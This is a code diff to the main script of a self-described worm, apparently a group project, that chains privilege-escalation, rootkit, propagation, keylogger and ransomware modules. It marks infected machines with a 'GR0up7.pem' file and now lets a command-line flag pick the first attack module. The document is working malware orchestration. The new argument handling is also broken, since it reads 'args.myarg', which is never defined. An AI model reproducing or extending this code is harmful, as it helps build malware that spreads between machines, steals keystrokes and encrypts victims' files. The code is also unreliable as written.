@@ -3,7 +3,7 @@
 ###########################################################################################################################
 
 import os
-import netifaces
+import argparse
 import subprocess
 from time import sleep
 
@@ -17,31 +17,24 @@ from modules import instructions
 from modules import ransomware
 
 ###########################################################################################################################
-#################################################     INITIALIZATIONS     #################################################
-###########################################################################################################################
-
-# Path: /home/$USER/GR0up7.pem
-NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
-
-# Computer is already infected
-# if os.path.exists(NO_INFECTION_FILE): exit()
-
-# PUBLIC_IP = os.environ.get("USER")
-try:
-    PUBLIC_IP = netifaces.ifaddresses("enp0s3")[netifaces.AF_INET][0]["addr"]
-except ValueError:
-    exit()
-print(f"Network IP: {PUBLIC_IP}")
-
-###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
 
-def main():
+def main(start_module):
     print("Worm just landed!")
 
     # Creates a file for the propagation module to identify whether a computer is already infected or not
+    PUBLIC_IP = os.environ.get("USER")
+
+    # Path: /home/$USER/GR0up7.pem
+    NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
+
+    # Computer is already infected
+    if os.path.exists(NO_INFECTION_FILE):
+        start_module = "instructions"
+
+    print(f"Public IP: {PUBLIC_IP}")
     if not (os.path.exists(NO_INFECTION_FILE)):
         with open(NO_INFECTION_FILE, "w") as file:
             pass
@@ -62,7 +55,7 @@ def main():
     }
 
     # First step
-    next_step = "privesc"
+    next_step = start_module
     result = None
 
     while next_step != "clean":
@@ -107,5 +100,31 @@ def main():
             sleep(4)
 
 
+###########################################################################################################################
+#################################################     INITIALIZATIONS     #################################################
+###########################################################################################################################
+
 if __name__ == "__main__":
-    main()
+    # parse argument
+    parser = argparse.ArgumentParser(description="Group7 Worm")
+    parser.add_argument(
+        "-m",
+        type=str,
+        help="Module to start (privesc, rootkit, propagation, instructions, keylogger...)",
+    )
+    args = parser.parse_args()
+
+    start_module = None
+
+    # args.m contains module to start
+    # ex: python3 main.py -m privesc
+    # args.m = "privesc"
+    if args.myarg is not None and isinstance(args.myarg, str):
+        start_module = args.m
+        print(f"myarg is a valid string: {args.myarg}")
+    else:
+        print("Start argument not valid :(")
+        print("Using default: privesc")
+        start_module = "privesc"
+
+    main(start_module)
